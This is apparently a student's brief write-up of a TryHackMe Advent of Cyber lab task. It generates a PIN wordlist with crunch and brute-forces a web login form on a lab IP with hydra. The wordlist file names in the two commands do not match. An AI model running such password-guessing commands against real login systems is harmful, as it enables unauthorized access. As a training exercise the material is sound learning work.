# Task 9 [Day 3] Brute-forcing: Hydra is Coming to Town
# The Story
![Image](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/87f456172b2ef2b072a057d4912dbfdf.svg)

## *Answer Of The Question Below*

#### Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?
![IMAGE](1.png)
```html
<form method="post" action="login.php" class="grid grid-cols-3 max-w-lg mx-auto bg-thm-900 p-4 font-mono">
  <input type="hidden" name="pin" />
</html>
```
![Image](2.png)

#### Generating the Password List
```bash
mkdir passlist && cd passlist
```
![Image](3.png)

```bash
crunch 3 3 0123456789ABCDEF -o 3digits.txt
```
![Image](4.png)

 
#### Using the Password List
![image](5(1).png)
```bash
hydra -l '' -P 3pass.txt -f -v 10.10.172.65 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```
#### Found Pin:
![image](6.png)


![image](7.png)




